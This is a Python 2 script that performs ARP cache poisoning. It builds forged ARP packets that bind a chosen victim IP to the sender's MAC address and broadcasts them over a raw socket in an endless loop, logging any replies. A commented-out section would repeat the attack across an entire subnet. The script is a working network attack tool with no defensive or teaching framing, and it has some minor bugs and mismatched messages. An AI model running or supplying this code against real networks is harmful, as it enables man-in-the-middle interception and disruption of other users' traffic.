#!/usr/bin/env python

import socket
import struct
import sys
import netifaces
import binascii
import time

# victim_ip: Source IP assumed by the target,
#	     our MAC Address gets updated corresponding to victims IP
#	     in the ARP table available with the target
#
# target_ip: Destination IP to be poisoned

if len(sys.argv) == 3 :
        target_ip = sys.argv[2]
	victim_ip = sys.argv[1]
else: #incorrect values, print help
        print "Usage: %s victim_IP target_IP \n   eg: %s 192.168.1.0 192.24.31.1" % (sys.argv[0],sys.argv[0])
        exit(1)

interface = "wlan0"		
# Default network device (ethernet card) plugged in the system
print "interface defaulting to eth0"

networkdetails = netifaces.ifaddresses(interface)
ipaddress = networkdetails[2][0]['addr']
macaddress = networkdetails[17][0]['addr']
print "Attempting to arp poison %s(Target IP) from %s(Victim's IP) using %s(My MAC Address)" % (target_ip,victim_ip,macaddress)


#def spoof(target_ip, victim_ip, macaddress):
# create packet
eth_hdr = struct.pack("!6s6s2s", '\xff\xff\xff\xff\xff\xff', macaddress.replace(':','').decode('hex'), '\x08\x06')                              
arp_hdr = struct.pack("!2s2s1s1s2s", '\x00\x01', '\x08\x00', '\x06', '\x04', '\x00\x01')          
arp_sender = struct.pack("!6s4s", macaddress.replace(':','').decode('hex'), socket.inet_aton(victim_ip))
arp_target = struct.pack("!6s4s", '\x00\x00\x00\x00\x00\x00', socket.inet_aton(target_ip))

count = 0
while 1:#count != 0:
        count = count + 1
        try:
                # send packet
                rawSocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
                rawSocket.bind((interface, socket.htons(0x0806)))
                rawSocket.send(eth_hdr + arp_hdr + arp_sender + arp_target)
                
                # wait for response
                rawSocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
                rawSocket.settimeout(0.5)
                response = rawSocket.recvfrom(2048)
                if target_ip == socket.inet_ntoa(response[0][28:32]):
                        print "Response from the folloiwing mac " + binascii.hexlify(response[0][6:12]).swapcase()
#                        break
                continue
        except socket.timeout:
                print "Attempt number %i did not get a response" % (count + 1)
                continue

#for i in range(256):
#        target_ip = "192.24.33." + str(i)
#        thread.start_new_thread(spoof, (target_ip, victim_ip, macaddress))
#        time.sleep(0.2)
